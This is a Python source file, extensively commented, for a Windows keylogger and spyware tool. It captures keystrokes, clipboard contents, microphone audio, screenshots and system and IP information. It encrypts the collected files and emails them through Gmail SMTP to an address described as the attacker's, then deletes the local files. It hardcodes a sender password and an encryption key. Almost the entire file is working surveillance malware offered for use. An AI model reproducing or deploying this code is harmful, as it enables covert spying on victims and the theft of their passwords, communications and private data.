# Libraries for sending email
from email.mime.multipart import MIMEMultipart     # Creating multipart email messages
from email.mime.text import MIMEText               # Attaching text to email messages
from email.mime.base import MIMEBase               # Handling base MIME types
from email import encoders                         # Encoding email attachments
#In the context of email messages, "Multipart" refers to a type of message that contains multiple parts,
#where each part can have a different type of content (e.g., plain text, HTML, attachments, etc.). 

#"MIME" stands for "Multipurpose Internet Mail Extensions" and is a standard that extends the format of email messages to support various types of data 
# beyond simple text, allowing the inclusion of multimedia, binary data, and attachments within email messages.

#The `MIMEMultipart` class from the `email.mime.multipart` module allows you to create email messages with multiple parts,making it possible to include 
# various types of content within a single email, such as plain text, HTML, and attachments. It facilitates the creation of more complex and versatile email messages.

# Module to dynamically import other modules
import importlib

# Module for sending emails via SMTP (Simple Mail Transfer Protocol)
import smtplib

# Module for retrieving system and network information
import socket                                      # To get local machine's network information
import platform                                    # To get local machine's platform information

# Module for interacting with the Windows clipboard
import win32clipboard                            

# Module for capturing keyboard input
from pynput.keyboard import Key, Listener        

# Module for working with time and operating system
import time                                      # To introduce delays in the code
import os                                        # To interact with the operating system

# Module for working with WAV audio files
from scipy.io.wavfile import write               # To write audio data to WAV files

# Module for interacting with sound devices
import sounddevice as sd                        

# Module for working with cryptographic operations
from cryptography.fernet import Fernet           # To use the Fernet symmetric encryption 
#Fernet symmetric encryption is a method of encrypting and decrypting data using a single secret key, providing secure and efficient two-way encryption.

# Module for retrieving the current username
import getpass                                 

# Module for making HTTP requests
from requests import get                        # To perform HTTP GET requests

# Module for working with multiprocessing
from multiprocessing import Process, freeze_support    

# Module for taking screenshots (ImageGrab is a part of the PIL library)
from PIL import ImageGrab                       # To capture screenshots


# The name of the file where the keylog data will be stored
keys_information = "key_log.txt"

# File name for storing system and network information.
system_information = "systeminfo.txt"

# File name for storing clipboard data captured by the keylogger.
clipboard_information = "clipboard.txt"

# File name for storing audio data captured by the keylogger.
audio_information = "audio.wav"

# File name for storing screenshot images captured by the keylogger.
screenshot_information = "screenshot.png"

# File name for storing the encrypted keylog data.
keys_information_e = "e_key_log.txt"

# File name for storing encrypted system and network information.
system_information_e = "e_systeminfo.txt"

# File name for storing encrypted clipboard data captured by the keylogger.
clipboard_information_e = "e_clipboard.txt"

# Duration (in seconds) for which the microphone will record audio.
microphone_time = 10

# Time iteration (in seconds) between each iteration of the keylogging loop.
# This variable determines the interval between each iteration of capturing and logging key presses.
time_iteration = 15

# Number of iterations at which the keylogging process will end.
number_of_iterations_end = 3

# The email address used to send the captured keylog data to the attacker (hacker's email address).
email_address = "mailtohacker@gmail.com" #use your any temp mail address

# The password for the attacker's email address. (Note: In practice, it's not recommended to store sensitive information like passwords directly in the code.)
password = "dabdabdabjjdnnbR%%656%65v" #use password of your any temp mail address

# Get the username of the current logged-in user.
username = getpass.getuser()

# The recipient's email address. In this case, it is set to the attacker's email address for demonstration purposes.
toaddr = "mailtohacker@gmail.com" #use your any temp mail address

# Encryption Key: This variable 'key' stores the encryption key used for encrypting sensitive data before sending it via email.
# Fernet symmetric encryption is employed to ensure secure communication. The value is a Base64-encoded key for demonstration purposes only.
key = "FB-iW7aG2dlezYWdUF_ZyFe0nh2gwUvJxYcO4pNNJmE="  #Use key generated by your script


# The file path of the keylogger script itself
file_path = "D:\Keylogger Project\keylogger.py"

# A string representing the directory separator for the current operating system (in this case, a backslash for Windows)
extend = "\\"

# Combine 'file_path' and 'extend' to create the 'file_merge' variable.
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):
    # Set the sender's email address (the attacker's email address) using the 'email_address' variable.
    fromaddr = email_address

    # Create a MIMEMultipart message to compose the email.
    msg = MIMEMultipart()

    # Set the sender's email address in the 'From' header of the email.
    msg['From'] = fromaddr

    # Set the recipient's email address in the 'To' header of the email.
    msg['To'] = toaddr

    # Set the subject of the email.
    msg['Subject'] = "Log File"

    # Set the body of the email (Note: The text "Body_of_the_mail" is just a placeholder and can be replaced with a meaningful message).
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    # Specify the filename and read the attachment (the captured keylog data) in binary mode.
    filename = filename
    attachment = open(attachment, 'rb')

    # Create a MIMEBase object with content type 'application/octet-stream' (binary data) to handle the attachment.
    p = MIMEBase('application', 'octet-stream')

    # Set the payload (the content) of the attachment by reading the data from the attachment file.
    p.set_payload((attachment).read())

    # Encode the attachment in base64 format to ensure it can be sent as an email attachment.
    encoders.encode_base64(p)

    # Add a header specifying the attachment's filename.
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # Attach the payload (attachment) to the email message.
    msg.attach(p)

    # Set up the SMTP server (in this case, Gmail's SMTP server) and establish a secure TLS connection.
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()

    # Log in to the email account using the 'fromaddr' (sender's email) and 'password' (the email account's password).
    s.login(fromaddr, password)

    # Convert the email message to a string and send it via the SMTP server to the recipient's email address.
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)

    # Close the SMTP connection.
    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

def computer_information():
    # Open the file in "append" mode, which allows us to add new content to the file without overwriting existing data.
    # The file path is constructed using 'file_path', 'extend', and 'system_information' variables.
    with open(file_path + extend + system_information, "a") as f:

        # Get the hostname of the computer.
        hostname = socket.gethostname()

        # Get the local IP address (IPv4 address) of the computer using the hostname.
        IPAddr = socket.gethostbyname(hostname)

        try:
            # Get the public IP address of the computer by making an HTTP GET request to 'https://api.ipify.org'.
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            # If there's an exception while retrieving the public IP address, write a message indicating the failure.
            f.write("Couldn't get Public IP Address (most likely max query)")

        # Write the processor information to the file.
        f.write("Processor: " + (platform.processor()) + '\n')

        # Write the system information (e.g., operating system name and version) to the file.
        f.write("System: " + platform.system() + " " + platform.version() + '\n')

        # Write the machine information (e.g., x86, x64) to the file.
        f.write("Machine: " + platform.machine() + "\n")

        # Write the hostname of the computer to the file.
        f.write("Hostname: " + hostname + "\n")

        # Write the private IP address (IPv4 address) of the computer to the file.
        f.write("Private IP Address: " + IPAddr + "\n")

# Call the 'computer_information' function to gather and write the system and network information.
computer_information()

def copy_clipboard():
    # Open the file in "append" mode, which allows us to add new content to the file without overwriting existing data.
    # The file path is constructed using 'file_path', 'extend', and 'clipboard_information' variables.
    with open(file_path + extend + clipboard_information, "a") as f:

        try:
            # Open the clipboard to access its contents.
            win32clipboard.OpenClipboard()

            # Get the clipboard data and store it in the 'pasted_data' variable.
            pasted_data = win32clipboard.GetClipboardData()

            # Close the clipboard after accessing its contents.
            win32clipboard.CloseClipboard()

            # Write the clipboard data to the file.
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            # If there's an exception while copying the clipboard data, write a message indicating the failure.
            f.write("Clipboard could not be copied")

# Call the 'copy_clipboard' function to retrieve and write the clipboard contents to the file.
copy_clipboard()

# get the microphone
def microphone():
    # Set the sampling rate for audio recording (44100 samples per second).
    fs = 44100

    # Get the recording duration (in seconds) from the 'microphone_time' variable.
    seconds = microphone_time

    # Record audio from the microphone using the 'sd.rec' function from the 'sounddevice' module.
    # The number of samples to record is calculated based on the 'seconds' and 'fs' (sampling rate) variables.
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)

    # Wait for the recording to complete and ensure all data is recorded before proceeding.
    sd.wait()

    # Write the recorded audio data to a WAV file using the 'write' function from the 'scipy.io.wavfile' module.
    # The file path and 'audio_information' variable are used to determine the filename for saving the audio data.
    write(file_path + extend + audio_information, fs, myrecording)

# Call the 'microphone' function to record audio and save it to a WAV file.
microphone()

# Function to take a screenshot of the user's screen and save it as a PNG image file.
def screenshot():
    # Use 'ImageGrab.grab()' from the 'PIL' (Pillow) library to capture a screenshot of the entire screen.
    im = ImageGrab.grab()

    # Save the captured screenshot as a PNG image file using the 'save' method of the 'Image' object.
    # The filename is determined using the 'file_path', 'extend', and 'screenshot_information' variables.
    im.save(file_path + extend + screenshot_information)

# Call the 'screenshot' function to take a screenshot and save it as a PNG image file.
screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration 

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    # A variable to keep track of the count (this may be used later in the code)
    count = 0

    # A list to store the captured keys (this may be used later in the code)
    keys = []


    def on_press(key):
        # Declare that the variables 'keys', 'count', and 'currentTime' are global so we can access and modify them within this function.
        global keys, count, currentTime

        # Print the 'key' that was pressed (This is for demonstration/debugging purposes, and you might want to remove it in the final version).
        print(key)

        # Append the pressed 'key' to the 'keys' list, storing the captured keys.
        keys.append(key)

        # Increment the 'count' to keep track of how many keys have been pressed.
        count += 1

        # If 'count' reaches a specific threshold (in this case, 1), perform the following actions.
        if count >= 1:

            # Reset 'count' back to 0 for the next set of key captures.
            count = 0

            # Write the captured 'keys' list to the file using the 'write_file' function.
            write_file(keys)

            # Clear the 'keys' list to prepare for the next set of key captures.
            keys = []


    def write_file(keys):
        # Open the file in "append" mode, which allows us to add new content to the file without overwriting existing data.
        # The file path is constructed using 'file_path' and 'keys_information' variables.
        with open(file_path + keys_information, "a") as f:

            # Iterate through each key in the 'keys' list.
            for key in keys:

                # Convert the key to a string and remove any single quotes (') from it.
                k = str(key).replace("'", "")

                # If the key is the "space" key (indicated by 'find("space") > 0'), add a new line in the file to separate words.
                if k.find("space") > 0:
                    f.write('\n')

                # If the key does not contain "Key" (special keys like shift, ctrl, etc.), write the key to the file.
                # The purpose of 'find("Key") == -1' is to exclude special keys from being written to the file.
                elif k.find("Key") == -1:
                    f.write(k)

            # Close the file after writing all the keys.
            f.close()

    def on_release(key):
    # If the 'key' that was released is the "esc" key (Key.esc), exit the listener loop by returning False.
    # This means that when the user presses the "esc" key, the keylogging process will be terminated.
        if key == Key.esc:
            return False

    # Check if the current time has exceeded the stopping time (the time to end one iteration of the keylogging process).
    # If the time has exceeded the stopping time, exit the listener loop by returning False.
    # This is used in conjunction with the main loop to control the keylogging iterations.
        if currentTime > stoppingTime:
            return False


    # Set up the keyboard listener with the provided 'on_press' and 'on_release' callbacks.
    # The 'on_press' callback will be called when a key is pressed, and the 'on_release' callback will be called when a key is released.
    # The 'Listener' will capture and handle keyboard events during its execution.
    with Listener(on_press=on_press, on_release=on_release) as listener:

        # Start the listener and wait for it to join the current thread.
        # The 'join()' method will keep the current thread running until the listener is stopped (e.g., by pressing the "esc" key).
        listener.join()
        
    # If the current time is greater than the stopping time, the keylogging process for one iteration is complete.
    if currentTime > stoppingTime:

    # Open the 'keys_information' file in "write" mode and overwrite its content with a single space, effectively clearing the file.
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        # Capture a screenshot and save it as a PNG image file.
        screenshot()

        # Send an email containing the captured screenshot as an attachment.
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        # Capture clipboard contents and log them to the clipboard file.
        copy_clipboard()

        # Increment the 'number_of_iterations' variable to keep track of how many iterations have been completed.
        number_of_iterations += 1

        # Update the current time.
        currentTime = time.time()

        # Calculate the new stopping time by adding the 'time_iteration' to the current time.
        stoppingTime = time.time() + time_iteration

# List of files to be encrypted.
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]

# List of names for the encrypted files.
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

# Initialize a counter to keep track of the current file being processed.
count = 0

# Loop through each file in 'files_to_encrypt' and perform encryption.
for encrypting_file in files_to_encrypt:
    # Read the contents of the file in binary mode.
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    # Initialize the Fernet encryption object with the 'key' variable (assumed to be defined earlier).
    fernet = Fernet(key)

    # Encrypt the file contents using Fernet encryption.
    encrypted = fernet.encrypt(data)

    # Write the encrypted data to the corresponding encrypted file.
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    # Send an email containing the encrypted file as an attachment.
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)

    # Increment the counter for the next file.
    count += 1

# Pause execution for 2 minutes (120 seconds).
time.sleep(120)

# List of files to be deleted after encryption and sending.
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]

# Loop through the files to be deleted and remove them from the file system.
for file in delete_files:
    os.remove(file_merge + file)

